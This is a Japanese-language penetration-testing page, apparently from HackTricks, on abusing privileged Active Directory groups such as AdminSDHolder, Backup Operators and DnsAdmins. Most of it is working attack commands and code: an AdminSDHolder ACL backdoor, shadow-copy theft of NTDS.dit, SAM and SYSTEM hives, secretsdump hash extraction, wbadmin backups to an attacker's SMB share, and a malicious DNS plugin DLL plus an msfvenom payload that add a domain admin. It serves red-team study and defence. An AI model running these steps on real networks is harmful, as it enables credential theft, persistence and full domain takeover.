# 特権グループ

{{#include ../../banners/hacktricks-training.md}}

## 管理権限を持つよく知られたグループ

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## アカウントオペレーター

このグループは、ドメイン上の管理者でないアカウントやグループを作成する権限を持っています。さらに、ドメインコントローラー（DC）へのローカルログインを可能にします。

このグループのメンバーを特定するには、次のコマンドが実行されます:
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
新しいユーザーの追加は許可されており、DC01へのローカルログインも可能です。

## AdminSDHolder グループ

**AdminSDHolder** グループのアクセス制御リスト (ACL) は重要であり、Active Directory 内のすべての「保護されたグループ」、特に高特権グループの権限を設定します。このメカニズムは、無許可の変更を防ぐことによって、これらのグループのセキュリティを確保します。

攻撃者は、**AdminSDHolder** グループの ACL を変更し、標準ユーザーに完全な権限を付与することでこれを悪用する可能性があります。これにより、そのユーザーはすべての保護されたグループに対して完全な制御を持つことになります。このユーザーの権限が変更または削除された場合、システムの設計により、1時間以内に自動的に復元されます。

メンバーを確認し、権限を変更するためのコマンドには次のものが含まれます:
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```
スクリプトは復元プロセスを迅速化するために利用可能です: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1)。

詳細については、[ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)を訪問してください。

## AD リサイクル ビン

このグループのメンバーシップは、削除された Active Directory オブジェクトの読み取りを許可し、機密情報を明らかにする可能性があります:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### ドメインコントローラーアクセス

DC上のファイルへのアクセスは、ユーザーが`Server Operators`グループの一部でない限り制限されています。これによりアクセスレベルが変更されます。

### 特権昇格

Sysinternalsの`PsService`または`sc`を使用することで、サービスの権限を検査および変更できます。例えば、`Server Operators`グループは特定のサービスに対して完全な制御を持ち、任意のコマンドの実行や特権昇格を可能にします。
```cmd
C:\> .\PsService.exe security AppReadiness
```
このコマンドは、`Server Operators`が完全なアクセス権を持ち、特権を昇格させるためにサービスを操作できることを明らかにします。

## Backup Operators

`Backup Operators`グループのメンバーシップは、`SeBackup`および`SeRestore`特権により、`DC01`ファイルシステムへのアクセスを提供します。これらの特権により、明示的な権限がなくても、`FILE_FLAG_BACKUP_SEMANTICS`フラグを使用してフォルダのトラバーサル、リスト表示、およびファイルコピー機能が可能になります。このプロセスには特定のスクリプトを利用する必要があります。

グループメンバーをリストするには、次のコマンドを実行します:
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### ローカル攻撃

これらの特権をローカルで活用するために、以下の手順が使用されます：

1. 必要なライブラリをインポートする：
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. `SeBackupPrivilege`を有効にして確認する:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. 制限されたディレクトリからファイルにアクセスし、コピーします。例えば：
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD攻撃

ドメインコントローラーのファイルシステムへの直接アクセスは、ドメインユーザーとコンピューターのすべてのNTLMハッシュを含む`NTDS.dit`データベースの盗難を可能にします。

#### diskshadow.exeを使用する

1. `C`ドライブのシャドウコピーを作成します:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. シャドウコピーから `NTDS.dit` をコピーします:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
代わりに、ファイルコピーには `robocopy` を使用します：
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. ハッシュ取得のために `SYSTEM` と `SAM` を抽出する:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. `NTDS.dit`からすべてのハッシュを取得します:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
#### wbadmin.exeの使用

1. 攻撃者のマシンでSMBサーバー用にNTFSファイルシステムを設定し、ターゲットマシンにSMB資格情報をキャッシュします。
2. `wbadmin.exe`を使用してシステムバックアップと`NTDS.dit`の抽出を行います：
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

実践的なデモについては、[DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s)を参照してください。

## DnsAdmins

**DnsAdmins**グループのメンバーは、DNSサーバー上でSYSTEM権限を持つ任意のDLLをロードするためにその権限を悪用できます。これは通常、ドメインコントローラー上でホストされています。この能力は、重大な悪用の可能性を提供します。

DnsAdminsグループのメンバーをリストするには、次のコマンドを使用します：
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### 任意のDLLを実行する

メンバーは、次のようなコマンドを使用して、DNSサーバーに任意のDLL（ローカルまたはリモート共有から）をロードさせることができます:
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
DNSサービスを再起動する（追加の権限が必要な場合があります）は、DLLをロードするために必要です：
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
この攻撃ベクターの詳細については、ired.teamを参照してください。

#### Mimilib.dll

特定のコマンドやリバースシェルを実行するように変更することで、mimilib.dllを使用してコマンド実行を行うことも可能です。[この投稿を確認してください](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) さらなる情報のために。

### WPADレコードによるMitM

DnsAdminsは、グローバルクエリブロックリストを無効にした後にWPADレコードを作成することで、DNSレコードを操作してMan-in-the-Middle (MitM) 攻撃を実行できます。ResponderやInveighのようなツールを使用して、スプーフィングやネットワークトラフィックのキャプチャを行うことができます。

### イベントログリーダー
メンバーはイベントログにアクセスでき、平文のパスワードやコマンド実行の詳細など、機密情報を見つける可能性があります。
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Permissions

このグループは、ドメインオブジェクトのDACLを変更でき、DCSync権限を付与する可能性があります。このグループを利用した特権昇格の手法は、Exchange-AD-Privesc GitHubリポジトリに詳述されています。
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
## Hyper-V 管理者

Hyper-V 管理者は Hyper-V への完全なアクセス権を持ち、これを利用して仮想化されたドメインコントローラーを制御することができます。これには、ライブ DC のクローン作成や NTDS.dit ファイルから NTLM ハッシュを抽出することが含まれます。

### 攻撃の例

Firefox の Mozilla Maintenance Service は、Hyper-V 管理者によって SYSTEM としてコマンドを実行するために悪用される可能性があります。これには、保護された SYSTEM ファイルへのハードリンクを作成し、それを悪意のある実行可能ファイルに置き換えることが含まれます。
```bash
# Take ownership and start the service
takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
sc.exe start MozillaMaintenance
```
注意: ハードリンクの悪用は、最近のWindowsアップデートで軽減されています。

## 組織管理

**Microsoft Exchange**が展開されている環境では、**Organization Management**と呼ばれる特別なグループが重要な権限を持っています。このグループは、**すべてのドメインユーザーのメールボックスにアクセスする**特権を持ち、**'Microsoft Exchange Security Groups'**の組織単位（OU）に対して**完全な制御**を維持しています。この制御には、特権昇格に悪用される可能性のある**`Exchange Windows Permissions`**グループが含まれます。

### 特権の悪用とコマンド

#### プリントオペレーター

**Print Operators**グループのメンバーは、**`SeLoadDriverPrivilege`**を含むいくつかの特権を持っており、これにより**ドメインコントローラーにローカルでログオン**し、シャットダウンし、プリンターを管理することができます。これらの特権を悪用するには、特に**`SeLoadDriverPrivilege`**が昇格されていないコンテキストで表示されない場合、ユーザーアカウント制御（UAC）をバイパスする必要があります。

このグループのメンバーをリストするには、次のPowerShellコマンドが使用されます:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
**`SeLoadDriverPrivilege`**に関連する詳細なエクスプロイト技術については、特定のセキュリティリソースを参照する必要があります。

#### リモートデスクトップユーザー

このグループのメンバーは、リモートデスクトッププロトコル（RDP）を介してPCにアクセスする権限が与えられています。これらのメンバーを列挙するために、PowerShellコマンドが利用可能です：
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
RDPの悪用に関するさらなる洞察は、専用のペンテストリソースにあります。

#### リモート管理ユーザー

メンバーは**Windows Remote Management (WinRM)**を介してPCにアクセスできます。これらのメンバーの列挙は、次の方法で達成されます：
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
**WinRM**に関連するエクスプロイト技術については、特定のドキュメントを参照する必要があります。

#### サーバーオペレーター

このグループは、ドメインコントローラー上でさまざまな構成を行う権限を持っており、バックアップおよび復元の権限、システム時間の変更、システムのシャットダウンが含まれます。メンバーを列挙するためのコマンドは次のとおりです:
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
## References <a href="#references" id="references"></a>

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
- [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)


{{#include ../../banners/hacktricks-training.md}}
